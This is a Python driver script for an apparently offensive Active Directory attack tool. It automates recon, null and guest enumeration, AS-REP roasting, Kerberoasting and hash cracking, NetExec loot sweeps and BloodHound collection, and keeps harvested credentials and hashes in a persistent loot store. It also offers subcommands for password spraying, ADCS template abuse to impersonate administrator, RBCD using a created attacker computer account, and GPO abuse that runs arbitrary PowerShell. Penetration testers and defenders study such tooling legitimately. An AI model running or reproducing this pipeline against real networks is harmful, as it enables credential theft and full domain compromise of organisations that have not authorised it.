#!/usr/bin/env python3
"""autowin-new: automated Active Directory vulnerability discovery.

Discovery runs automatically from just a target range: it recons hosts,
enumerates users/shares, AS-REP/Kerberoasts and cracks, then sweeps NetExec's
vuln/CVE/loot modules and Certipy for ADCS flaws -- re-running the whole sweep
each time new users or credentials land in the DB, until it converges. The
first valid credential per domain also triggers a one-shot BloodHound collect.

Everything persists to a loot store (SQLite + files under --loot-dir): creds,
users, hashes (per-source files), shares, hosts, vulns. Runs RESUME by default
-- a re-run reloads the store and skips every step already completed for the
same context (new creds still trigger new work). Delete autowin.sqlite (or the
loot dir) to start fresh; use --rescan to force a new network scan only.

Password spraying is NOT automatic -- run the `spray` subcommand explicitly.
Exploitation is NOT automatic -- `adcs`, `rbcd`, `gpo` run one exploit on demand.
"""
import argparse
import sys

from schema import DB, User, Hash, Box, Share, Vuln
from nxcwrap import Cred
from shell import have
from store import Store
from console import info, good, err, warn, banner

import recon as _recon
import roast as _roast
import modules as _modules
import kerbrute as _kerbrute
import bloodhound as _bloodhound
import adcs as _adcs
import delegation as _delegation
import gpo as _gpo

SUBCOMMANDS = {'discover', 'spray', 'cred', 'adcs', 'rbcd', 'gpo'}


# ---- credential helpers ----------------------------------------------

def domain_creds(db: DB, password_only: bool = False) -> list[Cred]:
    """One best credential per domain (admin preferred), for per-domain ops."""
    chosen: dict[str, Cred] = {}
    for user in db._users:
        if password_only and user.password is None:
            continue
        try:
            cred = Cred.from_user(user)
        except ValueError:
            continue
        name = user.domain.name
        is_admin = len(user.admin_on) > 0
        if name not in chosen or (is_admin and not getattr(chosen[name], '_admin', False)):
            cred._admin = is_admin  # type: ignore[attr-defined]
            chosen[name] = cred
    return list(chosen.values())


def load_hosts(db: DB, store: Store) -> None:
    """Rebuild hosts/domains from the store BEFORE recon, so a resumed run can
    skip the network scan and still have its boxes."""
    for h in store.list_hosts():
        if h['hostname'] in db._hosts:
            continue
        dom = db.domain(h['domain'])
        box = Box(ip=h['ip'], hostname=h['hostname'], domain=dom, dc=h['dc'],
                  signing=h['signing'], smbv1=h['smbv1'], smb_null_auth=h['null_auth'], os=h['os'])
        db._hosts[box.hostname] = box
        dom.boxes.append(box)
        if box.dc:
            dom.dc = box


def load_findings(db: DB, store: Store) -> None:
    """Load users/credentials/hashes/shares/vulns from the store AFTER recon,
    anchoring them to boxes (from the store or this run's scan)."""
    def anchor_for(domain_name: str) -> Box | None:
        dom = db.domain(domain_name)
        return dom.dc or (dom.boxes[0] if dom.boxes else None)

    users = creds = 0
    for u in store.list_users():
        anchor = anchor_for(u['domain'])
        if anchor and db.find_user(anchor.domain, u['username']) is None:
            usr = User(name=u['username'], owner=anchor, description=u['description'])
            anchor.local_users[usr.name] = usr
            db._users.append(usr)
            users += 1
    for c in store.list_credentials():
        anchor = anchor_for(c['domain'])
        if anchor is None:
            continue
        usr = db.find_user(anchor.domain, c['username'])
        if usr is None:
            usr = User(name=c['username'], owner=anchor)
            anchor.local_users[usr.name] = usr
            db._users.append(usr)
            users += 1
        if c['is_hash'] and usr.hash is None:
            usr.hash = Hash(source='ntlm', hash=c['secret'])
            creds += 1
        elif not c['is_hash'] and usr.password is None:
            usr.password = c['secret']
            creds += 1
    for h in store.list_hashes():
        anchor = anchor_for(h['domain'])
        if anchor:
            usr = db.find_user(anchor.domain, h['username'])
            if usr and usr.hash is None:
                usr.hash = Hash(source=h['source'], hash=h['hash'])
    for s in store.list_shares():
        box = db._hosts.get(s['host'])
        if box and s['name'] not in box.local_shares:
            box.local_shares[s['name']] = Share(name=s['name'], owner=box, description=s['remark'],
                                                readable='R' in (s['perms'] or ''),
                                                writable='W' in (s['perms'] or ''))
    for v in store.list_vulns():
        box = db._hosts.get(v['host'])
        if box:
            vuln = Vuln(title=v['title'], owner=box, source=v['source'],
                        cve=v['cve'], detail=v['detail'], esc=v['esc'])
            box.vulns[vuln.key()] = vuln

    if users or creds:
        info(f'resume: loaded {users} user(s) and {creds} credential(s) from the store '
             f'(delete autowin.sqlite to start fresh)')


# ---- discovery pipeline ----------------------------------------------

def discover(args: argparse.Namespace) -> None:
    if not have('nxc'):
        err('nxc (NetExec) not found on PATH; it is required')
        return

    store = Store(args.loot_dir)
    db = DB(store=store)
    wordlist = args.wordlist
    crack = not args.no_crack

    info(f'loot store: {store.dir}')
    load_hosts(db, store)   # resume: boxes first, so recon can be skipped
    _recon.recon(db, args.ip_range, args.threads, exclude=args.exclude, rescan=args.rescan)
    if not db._hosts:
        err('no AD hosts discovered; nothing to do')
        store.close()
        return
    load_findings(db, store)   # users/creds/hashes/shares/vulns anchor to boxes

    for rnd in range(1, args.max_rounds + 1):
        banner(f'discovery round {rnd}')
        before = db.signature()

        if args.userlist:
            _kerbrute.userenum(db, args.userlist)

        info('enumerating users (SMB null / guest + RID brute)')
        _recon.enumerate_users(db, Cred.anonymous())
        _recon.enumerate_users(db, Cred.guest())
        info('enumerating shares (guest)')
        _recon.enumerate_shares(db, Cred.guest())

        info('as-rep roasting')
        _roast.asrep(db)
        if crack:
            _roast.crack_hashes(db, wordlist)

        creds = domain_creds(db, password_only=True)
        if creds:
            info(f'authenticated enumeration with {len(creds)} credential(s)')
            for cred in creds:
                _recon.enumerate_users(db, cred)
                _recon.ldap_enumerate_users(db, cred)
                _recon.enumerate_shares(db, cred)
                info(f'kerberoasting as {cred.username}')
                _roast.kerberoast(db, cred)
            if crack:
                _roast.crack_hashes(db, wordlist)

        # one-shot BloodHound collection per domain (first valid cred)
        _bloodhound.run_bloodhound(db)

        info('mapping local admin (Pwn3d!) across hosts')
        _roast.check_admin(db)

        info('sweeping NetExec vuln / CVE / loot modules')
        _modules.sweep(db)

        for cred in domain_creds(db, password_only=True):
            info(f'enumerating ADCS with certipy as {cred.username}')
            _adcs.find(db, cred)
            info('enumerating Kerberos delegation')
            _delegation.find_delegation(db, cred)

        if crack:
            _roast.crack_hashes(db, wordlist)

        if db.signature() == before:
            good(f'round {rnd}: converged, no new findings')
            break
        info(f'round {rnd}: new findings discovered, re-scanning')
    else:
        warn(f'stopped after max rounds ({args.max_rounds})')

    if args.timeroast and crack:
        info('timeroasting computer accounts')
        _roast.timeroast(db, wordlist)

    db.report()
    good(f'loot persisted to {store.dir} (users.txt, hashes/, autowin.sqlite)')
    store.close()


# ---- spray (explicit, never automatic) -------------------------------

def spray_cmd(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    try:
        if args.users:
            with open(args.users) as f:
                users = [l.strip() for l in f if l.strip()]
        else:
            users = [r['username'] for r in store.list_users(args.domain)]
        if not users:
            err('spray: no users (pass --users FILE, or run discover first to populate the store)')
            return

        base: list[str] = []
        if args.password:
            base.append(args.password)
        if args.passwords:
            with open(args.passwords) as f:
                base += [l.strip() for l in f if l.strip()]
        if not base and not args.password_equals_username:
            err('spray: give -p/--password, --passwords FILE, and/or --password-equals-username')
            return

        info(f'spraying {len(users)} user(s) against {args.dc} ({args.domain})')
        hits: list[tuple[str, str]] = []
        for user in users:
            candidates = ([user] if args.password_equals_username else []) + base
            hits += _roast.spray_targets(args.dc, args.domain, [user], candidates, store=store)
        (good if hits else warn)(f'spray complete: {len(hits)} credential(s) found')
    finally:
        store.close()


# ---- credential store management -------------------------------------

def cred_add(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    is_hash = bool(args.hash)
    secret = args.hash if is_hash else args.password
    store.add_credential(args.domain, args.user, secret, is_hash=is_hash,
                         source='manual', host=args.host or '')
    store.add_user(args.domain, args.user)
    good(f'stored credential {args.domain}\\{args.user} ({"hash" if is_hash else "password"})')
    store.close()


def cred_list(args: argparse.Namespace) -> None:
    store = Store(args.loot_dir)
    rows = store.list_credentials(args.domain)
    if not rows:
        info('no credentials stored')
    for c in rows:
        tag = 'hash' if c['is_hash'] else 'pass'
        print(f"{c['domain']}\\{c['username']}:{c['secret']} ({tag}, {c['source']})")
    store.close()


# ---- argument parsing -------------------------------------------------

def read_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(prog='autowin', description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = parser.add_subparsers(dest='command', required=True)

    d = sub.add_parser('discover', help='automated AD vulnerability discovery (default)')
    d.add_argument('ip_range', help='IP, CIDR, a.b.c.d-e range, or list')
    d.add_argument('-t', '--threads', type=int, default=64, help='concurrent recon threads')
    d.add_argument('-w', '--wordlist', default='/usr/share/wordlists/rockyou.txt',
                   help='wordlist for hashcat cracking')
    d.add_argument('--userlist', help='candidate username file to validate (kerbrute/nmap) and fold in')
    d.add_argument('--loot-dir', default='loot', help='persistent loot store directory')
    d.add_argument('--max-rounds', type=int, default=3, help='max discovery re-scan rounds')
    d.add_argument('--exclude', default='', help='hosts to skip (IP/CIDR/range/list), e.g. a jumpbox')
    d.add_argument('--rescan', action='store_true',
                   help='force a fresh network scan even if this range was scanned before')
    d.add_argument('--no-crack', action='store_true', help='skip hashcat cracking')
    d.add_argument('--timeroast', action='store_true', help='also timeroast computer accounts')
    d.set_defaults(func=discover)

    s = sub.add_parser('spray', help='[manual] password-spray stored/listed users (never automatic)')
    s.add_argument('dc', help='DC/host to authenticate against')
    s.add_argument('-d', '--domain', required=True)
    s.add_argument('--users', help='username list file (default: stored users for the domain)')
    s.add_argument('-p', '--password', help='a single password to try')
    s.add_argument('--passwords', help='password list file')
    s.add_argument('--password-equals-username', action='store_true',
                   help='try password == username for each user')
    s.add_argument('--loot-dir', default='loot')
    s.set_defaults(func=spray_cmd)

    c = sub.add_parser('cred', help='manage the persistent credential store')
    csub = c.add_subparsers(dest='cred_cmd', required=True)
    ca = csub.add_parser('add', help='add a credential you found elsewhere')
    ca.add_argument('-d', '--domain', required=True)
    ca.add_argument('-u', '--user', required=True)
    grp = ca.add_mutually_exclusive_group(required=True)
    grp.add_argument('-p', '--password')
    grp.add_argument('-H', '--hash', help='NTLM hash')
    ca.add_argument('--host', default='', help='host it is valid on (optional)')
    ca.add_argument('--loot-dir', default='loot')
    ca.set_defaults(func=cred_add)
    cl = csub.add_parser('list', help='list stored credentials')
    cl.add_argument('-d', '--domain', help='filter by domain')
    cl.add_argument('--loot-dir', default='loot')
    cl.set_defaults(func=cred_list)

    a = sub.add_parser('adcs', help='[exploit] abuse a vulnerable ADCS template (ESCx)')
    a.add_argument('dc', help='domain controller IP')
    a.add_argument('-u', '--user', required=True)
    a.add_argument('-p', '--password', required=True)
    a.add_argument('-d', '--domain', required=True)
    a.add_argument('--target', help='enrollment target (CA host); defaults to the DC')
    a.add_argument('--esc', help='ESC class to abuse (ESC1/2/3/4/6); auto-detect if omitted')
    a.add_argument('--ca', help='CA name (auto-detected if omitted)')
    a.add_argument('--template', help='template name (auto-detected if omitted)')
    a.add_argument('--upn', default='administrator', help='account to impersonate')
    a.set_defaults(func=lambda args: _adcs.exploit(
        args.domain, args.dc, args.user, args.password, args.target or args.dc,
        esc=args.esc, ca=args.ca, template=args.template, upn=args.upn))

    r = sub.add_parser('rbcd', help='[exploit] resource-based constrained delegation')
    r.add_argument('dc', help='domain controller IP/host')
    r.add_argument('-u', '--user', required=True)
    r.add_argument('-p', '--password', required=True)
    r.add_argument('-d', '--domain', required=True)
    r.add_argument('--target', required=True, help='victim computer (delegate-to)')
    r.add_argument('--impersonate', default='Administrator')
    r.add_argument('--computer', default='autowin$', help='attacker computer account to create')
    r.add_argument('--computer-pass', default='Autowin123!')
    r.add_argument('--clean', action='store_true', help='undo a previous run')
    r.set_defaults(func=lambda args: _delegation.rbcd(
        args.domain, args.dc, args.user, args.password, args.target,
        computer=args.computer, computer_pass=args.computer_pass,
        impersonate=args.impersonate, clean=args.clean))

    g = sub.add_parser('gpo', help='[exploit] code execution via an editable GPO (pyGPOAbuse)')
    g.add_argument('-u', '--user', required=True)
    g.add_argument('-p', '--password', required=True)
    g.add_argument('-d', '--domain', required=True)
    g.add_argument('--gpo-id', required=True, help='GUID of the GPO to abuse')
    g.add_argument('--command', required=True, help='PowerShell command to run in the GPO scope')
    g.add_argument('--taskname', default='AutoWinTask')
    g.set_defaults(func=lambda args: _gpo.gpo_abuse(
        args.domain, args.user, args.password, args.gpo_id, args.command, args.taskname))

    # allow `autowin <ip_range>` as shorthand for `autowin discover <ip_range>`
    argv = sys.argv[1:]
    if argv and argv[0] not in SUBCOMMANDS and argv[0] not in ('-h', '--help'):
        argv = ['discover'] + argv

    return parser.parse_args(argv)


def main() -> None:
    args = read_args()
    args.func(args)


if __name__ == '__main__':
    main()
